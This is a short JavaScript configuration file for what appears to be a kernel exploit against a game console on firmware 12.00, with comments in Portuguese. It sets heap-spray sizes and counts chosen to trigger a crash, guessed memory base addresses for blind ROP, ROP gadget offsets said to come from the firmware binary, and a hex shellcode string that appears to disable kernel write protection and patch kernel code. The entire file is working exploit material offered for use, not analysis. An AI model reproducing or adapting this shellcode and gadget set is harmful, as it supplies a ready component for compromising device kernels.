export const CONFIG = {
    // Limite agressivo (Vamos até a borda do crash)
    WORKER_LIMIT: 405, 
    
    // Tamanhos alvo (Focando no que deu sinal de vida)
    // 0xC0 = 192 bytes (Deu Panic antes)
    // 0xA0 = 160 bytes (Análise binária)
    SIZES_TO_TEST: [0xA0, 0xC0],

    // Quantidade massiva para vencer a fragmentação
    SPRAY_QUANTITY: 30000,

    // Bases prováveis (Estatística para ROP Cego)
    TARGET_BASES: [
        0x800000000n, 0x820000000n, // As mais comuns
        0x880000000n, 0x900000000n
    ]
};

// SEUS OFFSETS (Extraídos do ELF 12.00)
export const GADGETS = {
    pop_rdi: 0x2FEB5n,
    sys_mmap: 0x7500n,
    jmp_rsi: 0x47b31n
};

// Shellcode (Gezine 12.00)
export const SHELLCODE_HEX = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb00000041b990e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b08000000000066448989c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3";
